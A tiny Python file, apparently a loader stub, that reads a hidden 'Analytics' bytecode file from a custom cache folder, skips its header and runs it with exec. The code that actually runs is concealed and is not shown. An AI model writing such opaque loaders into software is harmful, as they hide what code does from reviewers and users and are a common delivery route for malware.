
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Analytics_49c51d94db0d40548e45e83480d0c66a.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
